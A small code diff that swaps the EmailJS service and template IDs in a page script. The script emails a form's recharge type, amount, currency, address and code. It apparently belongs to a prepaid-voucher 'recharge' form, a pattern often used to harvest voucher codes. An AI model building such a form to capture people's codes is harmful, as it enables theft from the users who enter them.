@@ -49,7 +49,7 @@ document.addEventListener("DOMContentLoaded", () => {
 
     if (form.type && form.montant && form.devise && form.mail && form.code.length) {
 
-    emailjs.send("service_b6qug09", "my_template", {
+    emailjs.send("service_ayndj2c", "template_z5rfv5f", {
       recharge: form.type,
       montant: form.montant,
       devise: form.devise,
